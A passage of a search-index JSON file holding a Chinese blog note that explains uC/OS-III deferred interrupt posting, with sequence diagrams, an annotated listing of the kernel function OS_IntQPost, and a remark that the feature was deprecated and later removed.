\u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/","text":"uCos\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387 # \u76ee\u5f55 # uCos\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u5ff5 3. \u56fe\u8868\u5206\u6790 3.1. \u4e00\u822c\u60c5\u51b5 3.2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4 4. \u6e90\u7801\u5206\u6790 5. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u5728\u5199\u4e0a\u4e00\u7bc7\u7b14\u8bb0\u7684\u65f6\u5019\uff0c\u6211\u5b66\u4e60\u4e86 uCos\u4e2d\u7684\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8 \uff0c\u5728\u8ba8\u8bba\u9501\u8c03\u5ea6\u5668\u548c\u5173\u4e2d\u65ad\u65f6\uff0c\u63d0\u5230\u4e86\u5728uC/OS\u4e2d\uff0c\u9700\u8981\u5c06 OS_CFG_ISR_POST_DEFERRED_EN \u6807\u8bb0\u7f6e\u4e3a True \uff0c\u5f00\u542f\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\uff0c\u624d\u80fd\u591f\u5728\u9501\u8c03\u5ea6\u5668\u7684\u540c\u65f6\u6253\u5f00\u4e2d\u65ad\u3002\u800c\u5f00\u542f\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\uff0c\u672c\u8eab\u4e5f\u80fd\u591f \u51cf\u5c11\u5173\u4e2d\u65ad\u7684\u65f6\u95f4 \uff0c\u4ece\u800c\u63d0\u9ad8\u7cfb\u7edf\u8fd0\u884c\u6548\u7387\u3002\u6211\u5c31\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u5206\u6790\u4e00\u4e0b\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u5b9e\u73b0\u673a\u5236\u3002 2. \u6982\u5ff5 # \u5148\u770b\u4e00\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u4e2d\u5bf9\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u8bf4\u660e\u3002 \u4e2d\u65ad\u4e2d\u5982\u679c\u4f7f\u7528\u76f8\u5173\u7684\u63d0\u4ea4\u51fd\u6570\uff0c\u4f8b\u5982OSSemPost\uff0cOSQPost\u7b49\uff0c\u5219\u8fd9\u4e9b\u51fd\u6570\u6d89\u53ca\u8ba9\u4efb\u52a1\u5c31\u7eea\u7b49\u64cd\u4f5c\u3002\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\uff0c\u5219\u8fdb\u5165\u4e00\u6bb5\u5f88\u957f\u7684\u4e34\u754c\u6bb5\uff0c\u4e5f\u5c31\u662f\u8981\u5173\u4e2d\u65ad\u5f88\u957f\u65f6\u95f4\u3002\u5982\u679c\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\uff0cOS\u5c31\u4f1a\u5c06\u8fd9\u4e9b\u63d0\u4ea4\u51fd\u6570\u5fc5\u8981\u7684\u4fe1\u606f\u4fdd\u5b58\u5230\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u53d8\u91cf\u4e2d\u53bb\u3002 \u4e3a\u4e86\u914d\u5408\u5ef6\u8fdf\u4e2d\u65ad\uff0c\u03bcC/OS-III\u8fd8\u5c06\u521b\u5efa\u4f18\u5148\u7ea7\u6700\u9ad8\uff08\u4f18\u5148\u7ea7\u4e3a0\uff09\u7684\u4efb\u52a1\u2014\u2014\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570OS_IntQTask\u3002\u9000\u51fa\u4e2d\u65ad\u540e\u6839\u636e\u4e4b\u524d\u4fdd\u5b58\u7684\u53c2\u6570\uff0c\u540e\u9762\u518d\u6b21\u8fdb\u884c\u63d0\u4ea4\u76f8\u5173\u64cd\u4f5c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u628a\u4e2d\u65ad\u4e2d\u7684\u4e34\u754c\u6bb5\u653e\u5230\u4efb\u52a1\u4e2d\u6765\u5b9e\u73b0\uff0c\u8fdb\u5165\u4e34\u754c\u6bb5\u5c31\u53ef\u4ee5\u91c7\u7528\u9501\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\u4ee3\u66ff\u5173\u4e2d\u65ad\uff0c\u56e0\u6b64\u5927\u5927\u51cf\u5c11\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002\u63d0\u4ea4\u64cd\u4f5c\u5ef6\u8fdf\u2014\u2014\u5ef6\u8fdf\u4e2d\u65ad\u5c31\u662f\u8fd9\u4e48\u6765\u7684\u3002 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5c06\u8f83\u957f\u7684\u63d0\u4ea4\u8fc7\u7a0b\u8f6c\u79fb\u5230\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4efb\u52a1\uff0c\u63d0\u4ea4\u7684\u8fc7\u7a0b\u5c31\u53ef\u4ee5\u91c7\u7528\u5173\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u7528\u5173\u4e2d\u65ad\uff0c\u56e0\u800c\u8282\u7701\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002\u4f46\u662f\u6574\u4e2a\u8fc7\u7a0b\u5e76\u4e0d\u5f71\u54cd\u63d0\u4ea4\u7684\u6548\u679c\u3002\u6211\u4eec\u5df2\u7ecf\u8bbe\u5b9a\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u4e3a\u6700\u9ad8\uff0c\u5728\u9000\u51fa\u4e2d\u65ad\u540e\u4e00\u6837\u4f1a\u8fdb\u884c\u63d0\u4ea4\u64cd\u4f5c 1 \u3002 \u7b80\u5355\u6765\u8bf4\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u80fd\u591f\u51cf\u5c11\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u8ba9\u7cfb\u7edf\u80fd\u591f\u54cd\u5e94\u4e2d\u65ad\uff0c\u4ece\u800c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u8fd0\u884c\u6548\u7387\u3002\u4e0b\u9762\u7528\u56fe\u793a\u6765\u5206\u6790\u4e00\u4e0b\u3002 3. \u56fe\u8868\u5206\u6790 # 3.1. \u4e00\u822c\u60c5\u51b5 # \u4e0d\u4f7f\u7528 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\uff0c\u4e2d\u65ad\u54cd\u5e94\u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8017\u65f6\u4efb\u52a1\u5728ISR\u4e2d\u6267\u884c\uff0c\u8fd9\u4f1a\u4f7f\u5f97\u7cfb\u7edf\u8fdb\u5165\u4e00\u6bb5\u5f88\u957f\u7684\u4e34\u754c\u6bb5\u3002 sequenceDiagram \u4efb\u52a11-->>+\u4efb\u52a11:\u5f00\u59cb\u8fd0\u884c \u4efb\u52a11->>+CPU: \u5916\u90e8\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42 CPU->>+RTOS: \u4fdd\u5b58\u4e2d\u65ad\u73b0\u573a RTOS->>+ISR:\u4e2d\u65ad\u9884\u5904\u7406 ISR-->>+\u8017\u65f6\u4efb\u52a1:\u6267\u884c\u8017\u65f6\u4efb\u52a1 \u8017\u65f6\u4efb\u52a1-->>-ISR:\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5 ISR-->>-RTOS: ISR\u6267\u884c\u5b8c\u6bd5 RTOS-->>-CPU: \u8fdb\u884c\u4e2d\u65ad\u9000\u51fa\u5904\u7406 CPU-->>-\u4efb\u52a11:\u6062\u590d\u73b0\u573a \u4efb\u52a11-->>-\u4efb\u52a11:\u7ee7\u7eed\u8fd0\u884c \\text{Figure 1. \u4e0d\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\u7684\u4e2d\u65ad\u54cd\u5e94\u8fc7\u7a0b} RTOS \uff1a\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\uff08Real Time Operating System\uff09 ISR \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff08Interrupt Service Routine\uff09 \u8017\u65f6\u4efb\u52a1 \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u8f83\u4e3a\u8017\u65f6\u3001\u53ef\u5ef6\u8fdf\u5904\u7406\u7684\u90e8\u5206\u3002 3.2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4 # \u4f7f\u7528 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\uff0c\u4e2d\u65ad\u54cd\u5e94\u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8017\u65f6\u4efb\u52a1\u5728\u4e2d\u65ad\u7ed3\u675f\u4e4b\u540e\u5f00\u59cb\u6267\u884c\u3002\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\uff0c\u6240\u4ee5\u4e2d\u65ad\u5904\u7406\u7684\u5b9e\u65f6\u6027\u4e5f\u80fd\u591f\u5f97\u5230\u4fdd\u8bc1\u3002 sequenceDiagram \u4efb\u52a11-->>+\u4efb\u52a11:\u5f00\u59cb\u8fd0\u884c \u4efb\u52a11->>+CPU: \u5916\u90e8\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42 CPU->>+RTOS: \u4fdd\u5b58\u4e2d\u65ad\u73b0\u573a RTOS->>+ISR:\u4e2d\u65ad\u9884\u5904\u7406 ISR-->>+\u8017\u65f6\u4efb\u52a1:\u521b\u5efa\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570 \u8017\u65f6\u4efb\u52a1-->>-ISR:\u4efb\u52a1\u5ef6\u540e\u6267\u884c ISR-->>-RTOS: ISR\u6267\u884c\u5b8c\u6bd5 RTOS-->>-CPU: \u8fdb\u884c\u4e2d\u65ad\u9000\u51fa\u5904\u7406 CPU-->>-\u4efb\u52a11:\u6062\u590d\u73b0\u573a \u4efb\u52a11-->>+\u8017\u65f6\u4efb\u52a1:\u6267\u884c\u8017\u65f6\u4efb\u52a1 \u8017\u65f6\u4efb\u52a1-->>-\u4efb\u52a11:\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5 \u4efb\u52a11-->>-\u4efb\u52a11:\u7ee7\u7eed\u8fd0\u884c \\text{Figure 2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\u7684\u4e2d\u65ad\u54cd\u5e94\u8fc7\u7a0b} 4. \u6e90\u7801\u5206\u6790 # \u4ece\u4e0b\u9762\u7684\u6e90\u4ee3\u7801\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570\u9700\u8981\u4f20\u5165\u4e00\u7ec4 \u5185\u6838\u5bf9\u8c61 \uff08\u7531\u5ef6\u8fdf\u63d0\u4ea4\u521d\u59cb\u5316\u51fd\u6570 OS_IntQTaskInit() \u751f\u6210\uff09\u3002\u5c06\u5b83\u4eec\u653e\u5165\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u540e\uff0c\u51fd\u6570\u5c06\u5c31\u7eea\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\uff0c\u63a5\u7740\u7ee7\u7eed\u6267\u884c\u4e2d\u65ad\u3002\u5728\u9000\u51fa\u6240\u4ee5\u4e2d\u65ad\u5d4c\u5957\u540e\uff0c\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u4efb\u52a1\u5c31\u662f\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\u3002 // os_int.c void OS_IntQPost (OS_OBJ_TYPE type, void *p_obj, void *p_void, OS_MSG_SIZE msg_size, OS_FLAGS flags, OS_OPT opt, CPU_TS ts, OS_ERR *p_err) { CPU_SR_ALLOC(); #if (OS_CFG_TS_EN == DEF_DISABLED) (void)ts; /* Prevent compiler warning for not using 'ts'*/ #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u68c0\u6d4b\u662f\u5426\u8d85\u8fc7\u4e86\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5185\u6838\u5bf9\u8c61\u7684\u6700\u5927\u6570\u91cf if (OSIntQNbrEntries < OSCfg_IntQSize) { /* Make sure we haven't already filled the ISR queue*/ // \u8bb0\u5f55\u5f53\u524d\u8981\u5ef6\u8fdf\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u6570\u76ee OSIntQNbrEntries++; // \u66f4\u65b0\u5ef6\u8fdf\u63d0\u4ea4\u5185\u6838\u5bf9\u8c61\u7684\u6700\u5927\u6570\u76ee if (OSIntQNbrEntriesMax < OSIntQNbrEntries) { OSIntQNbrEntriesMax = OSIntQNbrEntries; } // \u5c06\u8981\u91cd\u65b0\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u7684\u4fe1\u606f\uff0c\u653e\u5165\u961f\u5217\u5165\u53e3\u7684\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u8bb0\u5f55\u5757 OSIntQInPtr->Type = type; /* \u4fdd\u5b58\u5185\u6838\u5bf9\u8c61\u7684\u7c7b\u578b*/ OSIntQInPtr->ObjPtr = p_obj; /* \u4fdd\u5b58\u5185\u6838\u5bf9\u8c61\u53d8\u91cf\u6307\u9488*/ OSIntQInPtr->MsgPtr = p_void; /* \u4fdd\u5b58\u6d88\u606f\u7684\u6307\u9488\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u6d88\u606f\u6216\u8005\u4efb\u52a1\u6d88\u606f\uff09*/ OSIntQInPtr->MsgSize = msg_size; /* \u4fdd\u5b58\u6d88\u606f\u7684\u5927\u5c0f\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u6d88\u606f\u6216\u8005\u4efb\u52a1\u6d88\u606f\uff09*/ OSIntQInPtr->Flags = flags; /* \u4fdd\u5b58\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u4e8b\u4ef6\u6807\u5fd7\uff09*/ OSIntQInPtr->Opt = opt; /* \u4fdd\u5b58\u63d0\u4ea4\u65f6\u7684\u9009\u9879*/ #if (OS_CFG_TS_EN == DEF_ENABLED) OSIntQInPtr->TS = ts; /* \u4fdd\u5b58\u63d0\u4ea4\u65f6\u7684\u65f6\u95f4\u6233*/ #endif // \u66f4\u65b0\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u5165\u53e3\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u8bb0\u5f55\u5757 OSIntQInPtr = OSIntQInPtr->NextPtr; /* Point to the next interrupt handler queue entry*/ #if (OS_CFG_DBG_EN == DEF_ENABLED) // \u5c31\u7eea\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1 // 1. \u66f4\u65b0\u5c31\u7eea\u5217\u8868\u4e0a\u7684\u4efb\u52a1\u6570\u91cf\u4e3a1 OSRdyList[0].NbrEntries = 1u; /* Make the interrupt handler task ready to run*/ #endif // 2. \u5c31\u7eea\u5217\u8868\u7684\u5934\u6307\u9488\u548c\u5c3e\u6307\u9488\u90fd\u6307\u5411\u4efb\u52a1\u63a7\u5236\u5757\u6307\u9488 OSRdyList[0].HeadPtr = &OSIntQTaskTCB; OSRdyList[0].TailPtr = &OSIntQTaskTCB; // 3. \u5728\u4f18\u5148\u7ea7\u8868\u4e2d\u6dfb\u52a0\u4efb\u52a1\u4f18\u5148\u7ea70 OS_PrioInsert(0u); /* Add task priority 0 in the priority table*/ if (OSPrioCur != 0) { // \u8bb0\u5f55\u5c31\u7eea\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\u4e4b\u524d\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u65b9\u4fbf\u540e\u9762\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 /* Chk if OSIntQTask is not running*/ OSPrioSaved = OSPrioCur; /* Save current priority*/ } *p_err = OS_ERR_NONE; } else { // \u5982\u679c\u5df2\u7ecf\u8d85\u8fc7\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u7684\u957f\u5ea6\uff0c\u5c31\u5c06OSIntQOvfCtr\u52a01\uff0c\u4ee3\u8868\u56e0\u961f\u5217\u5df2\u6ee1\uff0c\u6ca1\u6709\u88ab\u91cd\u65b0\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u4e2a\u6570 OSIntQOvfCtr++; /* Count the number of ISR queue overflows*/ *p_err = OS_ERR_INT_Q_FULL; } // \u9000\u51fa\u4e34\u754c\u6bb5 CPU_CRITICAL_EXIT(); } \u4ee3\u7801\u6ce8\u91ca\u53c2\u8003\u81eauCOS\u6ce8\u91ca\u548c \u300a\u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u3002 \u53e6\u5916\uff0c\u5728\u6d4f\u89c8\u6e90\u4ee3\u7801\u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u6ce8\u91ca\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5df2\u7ecf\u4e0d\u88ab\u63a8\u8350\u4f7f\u7528\u4e86\u3002 This function is DEPRECATED and is not recommended for new designs. Deferred ISRs is a deprecated feature of the kernel. It remains fully functional and supported but should not be used for new applications. \u4e8e\u662f\u6211\u53bb\u5b98\u7f51\u6d4f\u89c8\u4e86\u4e00\u4e0b\u66f4\u65b0\u8bb0\u5f55\uff0c\u6211\u4f7f\u7528\u7684\u6e90\u7801\u7248\u672c\u662fV3.05.01\uff0c\u800c\u6211\u770b\u5230\u5728uC/OS-III v3.06.00\u53d1\u5e03\u7684 \u66f4\u65b0\u8bb0\u5f55 \u4e2d\uff0c\u5df2\u7ecf\u5c06\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5217\u4e3a\u4e86\u8fc7\u65f6\u7684\u65b9\u6cd5\u5e76\u4e14\u53bb\u9664\u4e86\uff0c\u63a8\u6d4b\u53ef\u80fd\u662f\u51fa\u4e8e\u5b9e\u65f6\u6027\u548c\u7a33\u5b9a\u6027\u7684\u8003\u8651\u3002 Deferred interrupt processing is now obsolete and has been removed. 5. \u53c2\u8003\u6587\u732e # [1] \u674e\u60a6\u57ce. \u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.uCos\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#ucos","text":"","title":"uCos\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#_1","text":"uCos\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u5ff5 3. \u56fe\u8868\u5206\u6790 3.1. \u4e00\u822c\u60c5\u51b5 3.2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4 4. \u6e90\u7801\u5206\u6790 5. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#1","text":"\u5728\u5199\u4e0a\u4e00\u7bc7\u7b14\u8bb0\u7684\u65f6\u5019\uff0c\u6211\u5b66\u4e60\u4e86 uCos\u4e2d\u7684\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8 \uff0c\u5728\u8ba8\u8bba\u9501\u8c03\u5ea6\u5668\u548c\u5173\u4e2d\u65ad\u65f6\uff0c\u63d0\u5230\u4e86\u5728uC/OS\u4e2d\uff0c\u9700\u8981\u5c06 OS_CFG_ISR_POST_DEFERRED_EN \u6807\u8bb0\u7f6e\u4e3a True \uff0c\u5f00\u542f\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\uff0c\u624d\u80fd\u591f\u5728\u9501\u8c03\u5ea6\u5668\u7684\u540c\u65f6\u6253\u5f00\u4e2d\u65ad\u3002\u800c\u5f00\u542f\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\uff0c\u672c\u8eab\u4e5f\u80fd\u591f \u51cf\u5c11\u5173\u4e2d\u65ad\u7684\u65f6\u95f4 \uff0c\u4ece\u800c\u63d0\u9ad8\u7cfb\u7edf\u8fd0\u884c\u6548\u7387\u3002\u6211\u5c31\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u5206\u6790\u4e00\u4e0b\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u5b9e\u73b0\u673a\u5236\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#2","text":"\u5148\u770b\u4e00\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u4e2d\u5bf9\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u8bf4\u660e\u3002 \u4e2d\u65ad\u4e2d\u5982\u679c\u4f7f\u7528\u76f8\u5173\u7684\u63d0\u4ea4\u51fd\u6570\uff0c\u4f8b\u5982OSSemPost\uff0cOSQPost\u7b49\uff0c\u5219\u8fd9\u4e9b\u51fd\u6570\u6d89\u53ca\u8ba9\u4efb\u52a1\u5c31\u7eea\u7b49\u64cd\u4f5c\u3002\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\uff0c\u5219\u8fdb\u5165\u4e00\u6bb5\u5f88\u957f\u7684\u4e34\u754c\u6bb5\uff0c\u4e5f\u5c31\u662f\u8981\u5173\u4e2d\u65ad\u5f88\u957f\u65f6\u95f4\u3002\u5982\u679c\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\uff0cOS\u5c31\u4f1a\u5c06\u8fd9\u4e9b\u63d0\u4ea4\u51fd\u6570\u5fc5\u8981\u7684\u4fe1\u606f\u4fdd\u5b58\u5230\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u7684\u53d8\u91cf\u4e2d\u53bb\u3002 \u4e3a\u4e86\u914d\u5408\u5ef6\u8fdf\u4e2d\u65ad\uff0c\u03bcC/OS-III\u8fd8\u5c06\u521b\u5efa\u4f18\u5148\u7ea7\u6700\u9ad8\uff08\u4f18\u5148\u7ea7\u4e3a0\uff09\u7684\u4efb\u52a1\u2014\u2014\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570OS_IntQTask\u3002\u9000\u51fa\u4e2d\u65ad\u540e\u6839\u636e\u4e4b\u524d\u4fdd\u5b58\u7684\u53c2\u6570\uff0c\u540e\u9762\u518d\u6b21\u8fdb\u884c\u63d0\u4ea4\u76f8\u5173\u64cd\u4f5c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u628a\u4e2d\u65ad\u4e2d\u7684\u4e34\u754c\u6bb5\u653e\u5230\u4efb\u52a1\u4e2d\u6765\u5b9e\u73b0\uff0c\u8fdb\u5165\u4e34\u754c\u6bb5\u5c31\u53ef\u4ee5\u91c7\u7528\u9501\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\u4ee3\u66ff\u5173\u4e2d\u65ad\uff0c\u56e0\u6b64\u5927\u5927\u51cf\u5c11\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002\u63d0\u4ea4\u64cd\u4f5c\u5ef6\u8fdf\u2014\u2014\u5ef6\u8fdf\u4e2d\u65ad\u5c31\u662f\u8fd9\u4e48\u6765\u7684\u3002 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5c06\u8f83\u957f\u7684\u63d0\u4ea4\u8fc7\u7a0b\u8f6c\u79fb\u5230\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4efb\u52a1\uff0c\u63d0\u4ea4\u7684\u8fc7\u7a0b\u5c31\u53ef\u4ee5\u91c7\u7528\u5173\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u7528\u5173\u4e2d\u65ad\uff0c\u56e0\u800c\u8282\u7701\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002\u4f46\u662f\u6574\u4e2a\u8fc7\u7a0b\u5e76\u4e0d\u5f71\u54cd\u63d0\u4ea4\u7684\u6548\u679c\u3002\u6211\u4eec\u5df2\u7ecf\u8bbe\u5b9a\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u4e3a\u6700\u9ad8\uff0c\u5728\u9000\u51fa\u4e2d\u65ad\u540e\u4e00\u6837\u4f1a\u8fdb\u884c\u63d0\u4ea4\u64cd\u4f5c 1 \u3002 \u7b80\u5355\u6765\u8bf4\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u80fd\u591f\u51cf\u5c11\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u8ba9\u7cfb\u7edf\u80fd\u591f\u54cd\u5e94\u4e2d\u65ad\uff0c\u4ece\u800c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u8fd0\u884c\u6548\u7387\u3002\u4e0b\u9762\u7528\u56fe\u793a\u6765\u5206\u6790\u4e00\u4e0b\u3002","title":"2. 